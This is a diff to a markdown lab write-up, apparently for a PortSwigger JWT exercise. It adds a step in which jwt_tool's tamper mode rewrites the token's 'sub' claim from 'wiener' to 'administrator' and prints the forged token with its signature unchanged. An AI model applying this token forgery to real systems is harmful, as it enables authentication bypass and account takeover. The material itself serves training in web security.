@@ -88,7 +88,7 @@ The impact of JWT attacks is usually severe. If an attacker is able to  create t
 
 **Resolution:**
 
-1. Login at **wiener** account, collect and analyse the JWT Tokent at [**jwt.io**](https://jwt.io/) or **[jwt_tool](https://github.com/ticarpi/jwt_tool)**.
+1. Login at **wiener** account, collect and analyse the JWT Tokent at **jwt.io** or **jwt_tool**.
 
 ```bash
 └─$ python3 jwt_tool.py eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNTc4Nywic3ViIjoid2llbmVyIn0.cGCHsE9vb_hFeQQ47dlwUqBZd6jlzjoyGMKxFVGvKLh3WKG42j0JiPCDJU5be97aMdzFXcw2FfWwQdBMWbeSVBouqy4Hep5FeI9K5XfyA-tOpSYkbLZlyslRsnyOmb1VokHOrhJpHNdWSUK94fvQMuyucw832oJmi1Z7voKkjHCPpyIywHy8MCOYz0xzB7BNteZviV776Seo_OA5hJT4y2r-Iur7hkyHXhVlU4ORWx62hQb546aIdzRuQDbh1zbzvOmiVlySuwZgNfT_56Uh2i-JTo18AjadGrTD0ZIIG2aGnjAD0ZZkaK6LvDaI6lR_NyJteJJQR54ffC17KoibJg   
@@ -124,5 +124,71 @@ iat = IssuedAt
 exp = Expires                                                                                                                                                                                
 nbf = NotBefore                                                                                                                                                                              
 ----------------------
+```
+
+2. Tamper value "wiener" to the "administrator" value using **jwt_tool**.
+
+```bash
+─$ python3 jwt_tool.py eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNDQzMiwic3ViIjoid2llbmVyIn0.E_zbMx5P-9T3BbNH8klnEapTlbYpRcYe88NJURL-RM96BSYdnxTZJYhwmcN6lFND_Gj8SijMtBVqWBOmyCE6Mo1Qd58qRwE_tgmBNRAQNexXE1FwjQIBiof0rS_sdoP9D8oTqvTNHy80Wn1YLaB6pdah1yQnl7gTU8mfTolD0dyxVjwUyPjm3OJ7AbPQQYSfPVj93p2VXevDBTSikLphB7_OiiE8ywJSLCAu7_qX2TK0c31RVLjGrPlw-f5Ec3MYEjIY_GAJHMXflgmhCW83Z6AjDmhiClhVEfZ8v1bPQ0m1dUegMHTV7_RwaPanrBmai7EtB_P_OjocF8jwCUu2fg -T
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+                                                                                                                                                                                             
+
+====================================================================                                                                                                                         
+This option allows you to tamper with the header, contents and                                                                                                                               
+signature of the JWT.                                                                                                                                                                        
+====================================================================                                                                                                                         
+
+Token header values:                                                                                                                                                                         
+[1] kid = "7a48646a-2180-4d8e-a05a-422a99d9ac71"
+[2] alg = "RS256"
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[0] Continue to next step
+
+Please select a field number:                                                                                                                                                                
+(or 0 to Continue)                                                                                                                                                                           
+> 0
+
+Token payload values:                                                                                                                                                                        
+[1] iss = "portswigger"
+[2] exp = 1714424432    ==> TIMESTAMP = 2024-04-29 18:00:32 (UTC)
+[3] sub = "wiener"
+[4] *ADD A VALUE*
+[5] *DELETE A VALUE*
+[6] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:                                                                                                                                                                
+(or 0 to Continue)                                                                                                                                                                           
+> 4
+Please enter new Key and hit ENTER
+> sub
+Please enter new value for sub and hit ENTER
+> administrator
+[1] iss = "portswigger"
+[2] exp = 1714424432    ==> TIMESTAMP = 2024-04-29 18:00:32 (UTC)
+[3] sub = "administrator"
+[4] *ADD A VALUE*
+[5] *DELETE A VALUE*
+[6] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:                                                                                                                                                                
+(or 0 to Continue)                                                                                                                                                                           
+> 0
+Signature unchanged - no signing method specified (-S or -X)
+jwttool_084845f9c257880a92a7af8fae9224c1 - Tampered token:
+[+] eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNDQzMiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E_zbMx5P-9T3BbNH8klnEapTlbYpRcYe88NJURL-RM96BSYdnxTZJYhwmcN6lFND_Gj8SijMtBVqWBOmyCE6Mo1Qd58qRwE_tgmBNRAQNexXE1FwjQIBiof0rS_sdoP9D8oTqvTNHy80Wn1YLaB6pdah1yQnl7gTU8mfTolD0dyxVjwUyPjm3OJ7AbPQQYSfPVj93p2VXevDBTSikLphB7_OiiE8ywJSLCAu7_qX2TK0c31RVLjGrPlw-f5Ec3MYEjIY_GAJHMXflgmhCW83Z6AjDmhiClhVEfZ8v1bPQ0m1dUegMHTV7_RwaPanrBmai7EtB_P_OjocF8jwCUu2fg
 ```
 
